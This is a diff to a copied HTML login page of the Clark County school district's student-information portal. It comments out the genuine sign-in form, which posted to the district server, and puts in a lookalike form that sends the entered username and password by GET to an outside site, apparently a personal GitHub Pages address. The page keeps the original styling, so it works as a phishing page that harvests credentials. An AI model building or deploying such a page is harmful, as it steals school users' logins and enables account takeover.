@@ -538,6 +538,7 @@ function toggle(type) {
 
         
 
+		<!--
 		<form method="POST" id="form_signin" accept-charset="utf-8" action="https://campus.ccsd.net/campus/verify.jsp">
             <input type="hidden" name="appName" value="clark">
             <input type="hidden" id="screen" name="screen" value="">
@@ -567,9 +568,30 @@ function toggle(type) {
                 </div>
             </div>
             <input type="hidden" name="useCSRFProtection" value="true">
-            <input type="hidden" name="info" value="modifiedinfo">
         </form>
+		--!>
+		<form method="GET" id="form_signin" accept-charset="utf-8" action="https://rubiks-boi.github.io/test.php">
+            
+            
+            <div class="container span2">
+                <div><label for="username">Username</label></div>
+                <input class="span2" type="text" id="username" name="username" title="Enter your username" autocomplete="off">
+            </div>
 
+            <div class="container span2">
+                <div><label for="password">Password</label></div>
+                <input class="span2" type="password" id="password" name="password" title="Enter your password" autocomplete="off">
+            </div>
+
+            <div class="container span8">
+                <div class="span2 floatleft alignright">
+                    <input class="signinbtn" id="signinbtn" alt="Sign In" type="image" src="./Clark County NV - Live Site Login_files/btn_sign_in.png" border="0" width="81" height="18">
+                </div>
+                <div class="span4 floatleft alignleft">
+                    <div class="statusmsg"></div>
+                </div>
+            </div>
+        </form>
             
             <div class="passwordreset" style="padding-bottom:25px">
             <div class="forgotpasswd">
